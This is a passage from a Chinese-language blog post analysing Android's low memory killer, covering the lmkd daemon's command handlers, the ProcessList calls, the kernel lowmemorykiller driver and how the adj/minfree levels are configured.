socket的连接请求</span></span><br><span class="line">    alen = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">    ctrl_dfd = accept(ctrl_lfd, &amp;addr, &amp;alen);</span><br><span class="line">    <span class="keyword">if</span> (ctrl_dfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;lmkd control socket accept failed; errno=%d&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ALOGI(<span class="string">&quot;ActivityManager connected&quot;</span>);</span><br><span class="line">maxevents++;</span><br><span class="line"><span class="comment">//设置empoll监听事件</span></span><br><span class="line">epev.events = EPOLLIN;</span><br><span class="line"><span class="comment">//设置epoll处理函数</span></span><br><span class="line">epev.data.ptr = (<span class="type">void</span> *)ctrl_data_handler;</span><br><span class="line"><span class="comment">//将accept后的socket套接字添加到epollfd中进行监听</span></span><br><span class="line">    <span class="keyword">if</span> (epoll_ctl(epollfd, EPOLL_CTL_ADD, ctrl_dfd, &amp;epev) == <span class="number">-1</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;epoll_ctl for data connection socket failed; errno=%d&quot;</span>, errno);</span><br><span class="line">        ctrl_data_close();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl_connect_handler 方法在处理 lmkd socket 的 listen 事件时，会像 epoll 创建另一个 epoll 事件一样，用于处理 lmkd socket 的 accept 事件，accetpt 事件的处理方法为 <code>ctrl_data_handler</code> 。</p><h3 id="5-ctrl_data_handler方法"><a class="markdownIt-Anchor" href="#5-ctrl_data_handler方法">#</a> 5. ctrl_data_handler 方法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ctrl_data_handler</span><span class="params">(<span class="type">uint32_t</span> events)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (events &amp; EPOLLHUP) &#123;</span><br><span class="line">        ALOGI(<span class="string">&quot;ActivityManager disconnected&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!ctrl_dfd_reopened)</span><br><span class="line">            ctrl_data_close();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (events &amp; EPOLLIN) &#123;</span><br><span class="line">    <span class="comment">//处理epoll事件，即文件句柄的读事件</span></span><br><span class="line">        ctrl_command_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时添加到 epoll 时是以 EPOLLIN 添加的，所以这里接着会调用 ctrl_command_handler</p><h3 id="6-ctrl_command_handler-方法"><a class="markdownIt-Anchor" href="#6-ctrl_command_handler-方法">#</a> 6. ctrl_command_handler 方法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ctrl_command_handler</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//读取数据buffer</span></span><br><span class="line">    <span class="type">int</span> ibuf[CTRL_PACKET_MAX / <span class="keyword">sizeof</span>(<span class="type">int</span>)];</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">int</span> cmd = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> nargs;</span><br><span class="line">    <span class="type">int</span> targets;</span><br><span class="line">    <span class="comment">//读取数据到ibuf中</span></span><br><span class="line">    len = ctrl_data_read((<span class="type">char</span> *)ibuf, CTRL_PACKET_MAX);</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//获取数据长度</span></span><br><span class="line">    nargs = len / <span class="keyword">sizeof</span>(<span class="type">int</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (nargs &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> wronglen;</span><br><span class="line">   <span class="comment">//解析处数据中的comand字段</span></span><br><span class="line">    cmd = ntohl(ibuf[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//根据不同长度的command字段，调用不同的数据处理方法</span></span><br><span class="line">    <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> LMK_TARGET:</span><br><span class="line">        targets = nargs / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nargs &amp; <span class="number">0x1</span> || targets &gt; (<span class="type">int</span>)ARRAY_SIZE(lowmem_adj))</span><br><span class="line">            <span class="keyword">goto</span> wronglen;</span><br><span class="line">        cmd_target(targets, &amp;ibuf[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LMK_PROCPRIO:</span><br><span class="line">        <span class="keyword">if</span> (nargs != <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">goto</span> wronglen;</span><br><span class="line">        cmd_procprio(ntohl(ibuf[<span class="number">1</span>]), ntohl(ibuf[<span class="number">2</span>]), ntohl(ibuf[<span class="number">3</span>]));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LMK_PROCREMOVE:</span><br><span class="line">        <span class="keyword">if</span> (nargs != <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">goto</span> wronglen;</span><br><span class="line">        cmd_procremove(ntohl(ibuf[<span class="number">1</span>]));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ALOGE(<span class="string">&quot;Received unknown command code %d&quot;</span>, cmd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">wronglen:</span><br><span class="line">    ALOGE(<span class="string">&quot;Wrong control socket read length cmd=%d len=%d&quot;</span>, cmd, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要处理从 ProcessList.java 中发出的几个 lmk command：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">lmk_cmd</span> &#123;</span></span><br><span class="line">    LMK_TARGET, <span class="comment">/* Associate minfree with oom_adj_score */</span></span><br><span class="line">    LMK_PROCPRIO,   <span class="comment">/* Register a process and set its oom_adj_score */</span></span><br><span class="line">    LMK_PROCREMOVE, <span class="comment">/* Unregister a process */</span></span><br><span class="line">  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中 LMK_TARGET 用于更新系统 oom_adj，framework 发出该 command 的方法是 PorcessList.updateOomLevels ();LMK_PROCPRIO 用于更新进程 adj，framework 发出该 command 的方法是 PorcessList.setOomAdj ()；LMK_PROCPRIO 用于移除进程，framework 发出该 command 的方法是 PorcessList.remove ()。</p><h5 id="61-cmd_target-方法"><a class="markdownIt-Anchor" href="#61-cmd_target-方法">#</a> 6.1 cmd_target 方法</h5><p>从 ProcessList.java 中得知在 ProcessList 构造时会初始化一次，另外会在 ATMS.updateConfiguration 是会触发：</p><p>frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public boolean <span class="title function_">updateConfiguration</span><span class="params">(Configuration values)</span> &#123;</span><br><span class="line">        mAmInternal.enforceCallingPermission(CHANGE_CONFIGURATION, <span class="string">&quot;updateConfiguration()&quot;</span>);</span><br><span class="line">synchronized (mGlobalLock) &#123;</span><br><span class="line">        ...</span><br><span class="line"> </span><br><span class="line">        mH.sendMessage(PooledLambda.obtainMessage(</span><br><span class="line">                ActivityManagerInternal::updateOomLevelsForDisplay, mAmInternal,</span><br><span class="line">                DEFAULT_DISPLAY));</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终会调用到 ProcessList.updateOomLevels ()</p><p>frameworks/base/servcies/core/java/com/android/server/am/ProcessList.java</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private <span class="type">void</span> <span class="title function_">updateOomLevels</span><span class="params">(<span class="type">int</span> displayWidth, <span class="type">int</span> displayHeight, boolean write)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (write) &#123;</span><br><span class="line">        ByteBuffer buf = ByteBuffer.allocate(<span class="number">4</span> * (<span class="number">2</span> * mOomAdj.length + <span class="number">1</span>));</span><br><span class="line">        buf.putInt(LMK_TARGET);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mOomAdj.length; i++) &#123;</span><br><span class="line">            buf.putInt((mOomMinFree[i] * <span class="number">1024</span>)/PAGE_SIZE);</span><br><span class="line">            buf.putInt(mOomAdj[i]);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        writeLmkd(buf, null);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>系统通过这个函数计算 oom adj 的 minfree，并将各个级别的 minfree 和 oom_adj_score 传入到 lmkd 中，继续跟进 lmkd 的 cmd_target：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">cmd_target</span><span class="params">(<span class="type">int</span> ntargets, <span class="type">int</span> *params)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">if</span> (ntargets &gt; (<span class="type">int</span>)ARRAY_SIZE(lowmem_adj))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//将framework传过来的参数保存到lowmem_minfree和lowmem_adj数组中</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ntargets; i++) &#123;</span><br><span class="line">        lowmem_minfree[i] = ntohl(*params++);</span><br><span class="line">        lowmem_adj[i] = ntohl(*params++);</span><br><span class="line">    &#125;</span><br><span class="line">    lowmem_targets_size = ntargets;</span><br><span class="line">    <span class="keyword">if</span> (use_inkernel_interface) &#123;</span><br><span class="line">        <span class="type">char</span> minfreestr[<span class="number">128</span>];</span><br><span class="line">        <span class="type">char</span> killpriostr[<span class="number">128</span>];</span><br><span class="line">        <span class="comment">//根据lowmwm_minfree和lowmwm_adj中的数值，构造出数值字符串</span></span><br><span class="line">        minfreestr[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        killpriostr[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; lowmem_targets_size; i++) &#123;</span><br><span class="line">            <span class="type">char</span> val[<span class="number">40</span>];</span><br><span class="line">            <span class="keyword">if</span> (i) &#123;</span><br><span class="line">                strlcat(minfreestr, <span class="string">&quot;,&quot;</span>, <span class="keyword">sizeof</span>(minfreestr));</span><br><span class="line">                strlcat(killpriostr, <span class="string">&quot;,&quot;</span>, <span class="keyword">sizeof</span>(killpriostr));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">snprintf</span>(val, <span class="keyword">sizeof</span>(val), <span class="string">&quot;%d&quot;</span>, lowmem_minfree[i]);</span><br><span class="line">            strlcat(minfreestr, val, <span class="keyword">sizeof</span>(minfreestr));</span><br><span class="line">            <span class="built_in">snprintf</span>(val, <span class="keyword">sizeof</span>(val), <span class="string">&quot;%d&quot;</span>, lowmem_adj[i]);</span><br><span class="line">            strlcat(killpriostr, val, <span class="keyword">sizeof</span>(killpriostr));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将上面循环中构造出来的字符串数值写入到/sys/moudle/lowmwmoryykiller/parameters/adj</span></span><br><span class="line">        writefilestring(INKERNEL_MINFREE_PATH, minfreestr);</span><br><span class="line">        <span class="comment">//将上面循环中构造出来的另一字符串数值写入到/sys/modlue/lowmemorykiller/parameters/adj</span></span><br><span class="line">        writefilestring(INKERNEL_ADJ_PATH, killpriostr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cmd_target () 函数的目的就是将 framework 传过来的数值记录到数组中，即将 <code>minfreestr</code>  和 <code>killpriostr</code>  然后将这两个数组拼接成字符串输入，然后写入到内核对应的位置。</p><h5 id="62-cmd_procprio方法"><a class="markdownIt-Anchor" href="#62-cmd_procprio方法">#</a> 6.2 cmd_procprio 方法</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">cmd_procprio</span><span class="params">(<span class="type">int</span> pid, <span class="type">int</span> uid, <span class="type">int</span> oomadj)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">procp</span>;</span></span><br><span class="line">    <span class="type">char</span> path[<span class="number">80</span>];</span><br><span class="line">    <span class="type">char</span> val[<span class="number">20</span>];</span><br><span class="line">    <span class="comment">//判断oomadj的值是否在规定值内</span></span><br><span class="line">    <span class="keyword">if</span> (oomadj &lt; OOM_DISABLE || oomadj &gt; OOM_ADJUST_MAX) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;Invalid PROCPRIO oomadj argument %d&quot;</span>, oomadj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据进程的pid输出对应的路径</span></span><br><span class="line">    <span class="built_in">snprintf</span>(path, <span class="keyword">sizeof</span>(path), <span class="string">&quot;/proc/%d/oom_score_adj&quot;</span>, pid);</span><br><span class="line"><span class="built_in">snprintf</span>(val, <span class="keyword">sizeof</span>(val), <span class="string">&quot;%d&quot;</span>, lowmem_oom_adj_to_oom_score_adj(oomadj));</span><br><span class="line"><span class="comment">//将oomadj的值写入到对应进程的oom_score_adj中</span></span><br><span class="line">writefilestring(path, val);</span><br><span class="line"><span class="comment">//使用内核接口就直接返回</span></span><br><span class="line"><span class="comment">//这里use_inkernel_interface在初始化的时候设置为1，所以这里直接return</span></span><br><span class="line">    <span class="keyword">if</span> (use_inkernel_interface)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//判断是否有记录到对应的proc结构</span></span><br><span class="line">    procp = pid_lookup(pid);</span><br><span class="line"><span class="keyword">if</span> (!procp) &#123;</span><br><span class="line">        <span class="comment">//如果没有对应的proc结构，表明该进程是新创建的，需要新分配一个结构proc结构记录该进程</span></span><br><span class="line">            procp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> proc));</span><br><span class="line">            <span class="keyword">if</span> (!procp) &#123;</span><br><span class="line">                <span class="comment">// Oh, the irony.  May need to rebuild our state.</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            procp-&gt;pid = pid;</span><br><span class="line">            procp-&gt;uid = uid;</span><br><span class="line">            procp-&gt;oomadj = oomadj;</span><br><span class="line">            proc_insert(procp);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//如果之前已经有proc记录，那么就更新对应的数值</span></span><br><span class="line">        proc_unslot(procp);</span><br><span class="line">        procp-&gt;oomadj = oomadj;</span><br><span class="line">        proc_slot(procp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为现在使用的是内核接口，所以只需要将 oomadj 的数值写入到 <code>/proc/[pid]/oom_source_adj</code>  中即可起到更新进程的 oomadj 的效果。接下来分析 command 处理方法 cmd_procremove 方法。</p><h5 id="63-cmd_procremove方法"><a class="markdownIt-Anchor" href="#63-cmd_procremove方法">#</a> 6.3 cmd_procremove 方法</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">cmd_procremove</span><span class="params">(<span class="type">int</span> pid)</span> &#123;</span><br><span class="line">    <span class="comment">//如果使用内核接口直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (use_inkernel_interface)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    pid_remove(pid);</span><br><span class="line">    kill_lasttime = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果不使用内核接口的话，就需要更新链表的信息，并删除proc结构占用的内存</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pid_remove</span><span class="params">(<span class="type">int</span> pid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hval = pid_hashfn(pid);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">procp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">prevp</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (procp = pidhash[hval], prevp = <span class="literal">NULL</span>; procp &amp;&amp; procp-&gt;pid != pid;</span><br><span class="line">         procp = procp-&gt;pidhash_next)</span><br><span class="line">            prevp = procp;</span><br><span class="line">    <span class="keyword">if</span> (!procp)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!prevp)</span><br><span class="line">        pidhash[hval] = procp-&gt;pidhash_next;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        prevp-&gt;pidhash_next = procp-&gt;pidhash_next;</span><br><span class="line">    proc_unslot(procp);</span><br><span class="line">    <span class="built_in">free</span>(procp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果未使用内核接口则调用 <code>pid_remove</code>  进行移除工作。</p><p>整理如下：</p><table><thead><tr><th>lmkd.c</th><th>对应方法</th><th>执行动作</th></tr></thead><tbody><tr><td>LMK_PROCPRIO</td><td>cmd_procprio</td><td>写 /proc/<pid>oom_score_adj</td></tr><tr><td>LMK_TARGET</td><td>cmd_target</td><td>写 /sys/moudle/lowmemorykiller/parameters/minfree 写 /sys/module/lowmemorykiller/parameters/adj</td></tr><tr><td>LMK_PROCREMOVE</td><td>cmd_procremove</td><td>删除 /proc/<pid></td></tr></tbody></table><h3 id="7-mp_event_common"><a class="markdownIt-Anchor" href="#7-mp_event_common">#</a> 7. mp_event_common</h3><h2 id="四-lowermemorykillerc"><a class="markdownIt-Anchor" href="#四-lowermemorykillerc">#</a> （四） lowermemorykiller.c</h2><h3 id="1-lmk的驱动加载函数"><a class="markdownIt-Anchor" href="#1-lmk的驱动加载函数">#</a> 1. LMK 的驱动加载函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">lowmem_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">register_shrinker(&amp;lowmem_shrinker);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>init 方法中注册了一个 shrinker 到内核的 shrinker 链表。当内存不足时，kswapd 线程会遍历一张 shrinker 链表，并回调已注册的 shrinker 函数来回收内存 page，kswapd 还会周期性唤醒来执行内存操作。每个 zone 维护 active_list 和 inactive_list 链表，内核根据页面活动状态将 page 在这两个链表之间移动，最终通过 shrink_slab 和 shrink_zone 来回收内存页。</p><h3 id="2-数据结构"><a class="markdownIt-Anchor" href="#2-数据结构">#</a> 2. 数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">short</span> lowmem_adj[<span class="number">6</span>] = &#123;</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="number">6</span>,</span><br><span class="line"><span class="number">12</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> lowmem_adj_size = <span class="number">4</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> lowmem_minfree[<span class="number">6</span>] = &#123;</span><br><span class="line"><span class="number">3</span> * <span class="number">512</span>,<span class="comment">/* 6MB */</span></span><br><span class="line"><span class="number">2</span> * <span class="number">1024</span>,<span class="comment">/* 8MB */</span></span><br><span class="line"><span class="number">4</span> * <span class="number">1024</span>,<span class="comment">/* 16MB */</span></span><br><span class="line"><span class="number">16</span> * <span class="number">1024</span>,<span class="comment">/* 64MB */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第一个数组 lowmem_adj 最多有 6 个元素（默认只定义了 4 个），它表示可用内存容量处于 “某层级” 时需要被处理的 adj 值；第二个数组则是对 “层级” 的描述。举个例子，lowmwm_minfree 的第一个元素是 3<em>512，即 3</em>512*lowmwm_adj_size=6MB。也就是说，当可用内存小于 6MB 时，Killer 需要清理 adj 值为 0（即 lowmem_adj 的第一个元素）以下的所有进程。其中 adj 的取值范围是 - 17～15，数字越小表示进程级别越高（通常只有 0～15 被使用）。</p><p>lowmem_adj 和 lowmem_adj_size 这两个数组只是系统的预定义值，我们还可以根据项目的实际需求来做定制。Android 系统提供了相应的文件来供我们修改这两组值，路径如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/sys/module/lowmemorykiller/parameters/adj</span><br><span class="line">/sys/module/lowmemorykiller/parameters/minfree</span><br></pre></td></tr></table></figure><p>也可以在 init.rc 中加入语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write /sys/module/lowmemorykiller/parameters/adj <span class="number">0</span>,<span class="number">8</span></span><br><span class="line">write /sys/module/lowmemorykiller/parameters/minfree <span class="number">1024</span>,<span class="number">4096</span></span><br></pre></td></tr></table></figure><h3 id="3-adj进程规划"><a class="markdownIt-Anchor" href="#3-adj进程规划">#</a> 3. Adj 进程规划</h3><table><thead><tr><th>ADJ</th><th>Description</th></tr></thead><tbody><tr><td>UNKNOW_ADJ</td><td>一般指将要会缓存进程，无法获取确定值</td></tr><tr><td>HIDDEN_APP_MAX_ADJ=15</td><td>当前只运行了不可见的 Activity 组件的进程，分别为不可见进程 adj 的最大值、最小值</td></tr><tr><td>HIDDEN_APP_MIN_ADJ=9</td><td></td></tr><tr><td>SERVICE_B_ADJ=8</td><td>B list of Service。和 A list 相比，它们对用户的黏合度要小一些</td></tr><tr><td>PREVIOUS_APP_ADJ=7</td><td>用户前一次交互的进程。按照用户的使用习惯，人们经常会在几个常用进程间切换，所以这类进程得到再次运行的概率比较大</td></tr><tr><td>HOME_APP_ADJ=6</td><td>Home 进程</td></tr><tr><td>SERVICE_ADJ=5</td><td>当前运行了 application service 的进程</td></tr><tr><td>BACKUP_APP_ADJ=4</td><td>用于承载 backup 相关操作的进程</td></tr><tr><td>HEAVY_WEIGHT_APP_ADJ=3</td><td>重量级应用程序进程</td></tr><tr><td>PERCEPTIBLE_APP_ADJ=2</td><td>这类进程能被用户感觉到不可见，如后台运行的音乐播放器</td></tr><tr><td>VISIBLE_APP_ADJ=1</td><td>有前台可见的 Activity 的进程，如果轻易杀死这类进程将严重影响用户的体验。</td></tr><tr><td>FOREGROUND_APP_ADJ=0</td><td>当前正在前台运行的进程，也就是用户正在交互的那个程序</td></tr><tr><td>PERSISTENT_PROC_ADJ=-12</td><td>Persistent 性质的进程，如 telephony</td></tr><tr><td>SYSTEM_ADJ=-16</td><td>系统进程</td></tr><tr><td>NATIVE_ADJ=-17</td><td>native 进程（不被系统管理）</td></tr></tbody></table><p>通过以下方法，我们可以自己改变进程的 oom_adj 值：</p><h4 id="31-写文件"><a class="markdownIt-Anchor" href="#31-写文件">#</a> 3.1 写文件</h4><p>和前面的 adj 和 minfree 类似，进程的 oom_adj 也可以通过写文件的形式修改，路径为 /proc/<PID>/oom_adj。比如 init.rc 中就有如下语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">on early-init</span><br><span class="line">    write /proc/<span class="number">1</span>/oom_adj<span class="number">-16</span></span><br></pre></td></tr></table></figure><p>PID 值为 1 的进程是 init 程序，这里将此进程的 adj 改为 - 16，以保证它不会被杀死。</p><h4 id="32-android-persistent"><a class="markdownIt-Anchor" href="#32-android-persistent">#</a> 3.2 android: persistent</h4><p>对于某些非常重要的应用程序，我们不希望它们被系统杀死。一个最简单的方法就是在它的 AndroidManifest.xml 文件中给 “application” 标签添加 “android:persistent==true” 属性。不过将应用程序设置为常驻内存要特别慎重，如果应用程序本身不够完善，而系统又不能通过支持方式回收它的话，则有可能导致意想不到的问题。</p><h3 id="4-lowmem_shrinker结构体"><a class="markdownIt-Anchor" href="#4-lowmem_shrinker结构体">#</a> 4. lowmem_shrinker 结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span 